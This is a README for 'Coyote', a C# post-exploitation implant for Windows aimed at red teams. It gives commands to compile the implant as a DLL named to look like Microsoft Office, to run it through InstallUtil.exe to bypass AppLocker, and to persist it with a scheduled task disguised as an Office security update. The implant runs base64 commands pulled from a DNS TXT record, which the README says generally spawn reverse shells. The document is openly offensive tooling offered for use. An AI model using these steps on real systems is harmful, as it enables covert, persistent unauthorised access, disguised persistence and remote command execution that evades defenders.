# Coyote

Coyote is a standalone C# post-exploitation implant for maintaining access to compromised Windows infrastructure during red team engagements.

* Bypasses application whitelisting such as Microsoft AppLocker using InstallUtil.exe (see [MITRE ATT&CK ID: T1218.004](https://attack.mitre.org/techniques/T1218/004/))
* Retrieves commands from operator via recursive DNS tunnel (see [MITRE ATT&CK ID: T1071.004](https://attack.mitre.org/techniques/T1071/004/))
* Small footprint in memory and on the network

The basic premise is for the red team to leave this tiny DLL behind on a compromised Windows system and have it occasionally poll the DNS TXT record of a legitimate looking FQDN to check for instructions. When needed, the TXT record can contain a simple powershell one liner to spawn an interactive reverse shell out to a VPS, or the first stage of something more sophisticated, as per the operator's requirements. Coyote is not used for interactive control of the compromised system, rather to maintain access and spawn some other tool (a reverse shell, meterpreter etc) as required.

### Usage

First of all edit the coyote.cs source file and set the c2domain variable to the subdomain you will be using for your TXT record.

To compile it on your own Windows box: 

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:msoffice360.dll coyote.cs

This will create a small DLL file of approximately 5 KB called msoffice360.dll (use whatever filename you think will blend in on the target) which you will place on the target system.

To execute it once on the target workstation or server: 

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U msoffice360.dll

For it to be useful, Coyote needs to get executed repeatedly at some interval such as every 24 hours or upon each reboot. There are many ways to achieve this. See [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md) for a long list of techniques and pick one.

One way that will serve as an example is to hide the DLL in a user's AppData folder and then simply create a new scheduled task:

schtasks /CREATE /SC DAILY /TN "Microsoft Office security updates task" /TR "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Olivia\AppData\Local\Microsoft\msoffice360.dll" /ST 08:00

This means that every day at 0800 the built-in InstallUtil.exe will import and run the DLL's uninstall function, which will then do a recursive DNS lookup to check if a command is currently encoded in the TXT record, and if so execute it. This can hopefully remain undetected by the blue team until needed and act as a backup to any other methods being used to maintain remote access to the network.

To leave a command to be executed (generally this will be used to spawn an interactive reverse shell), base64 encode the exact string that you would have typed into the command line and place it in a TXT record on the subdomain that you set when you compiled the implant. Next time the implant calls home it will be executed.

### Proof-of-concept

We base64 encode the string calc.exe to get Y2FsYy5leGU=

We create a TXT record on our DNS server as follows:

TXT	updates.tartaruslabs.com	Y2FsYy5leGU=

This record is saved and from our laptop we then confirm it is active:

user@laptop:~$ host -t txt updates.tartaruslabs.com
updates.tartaruslabs.com descriptive text "Y2FsYy5leGU="

In coyote.cs we set the value of c2domain to "updates.tartaruslabs.com" and then compile it.

We execute the implant and sure enough calculator opens. 

![Coyote screenshot](https://github.com/TartarusLabs/Coyote/blob/main/screenshot.jpg?raw=true)

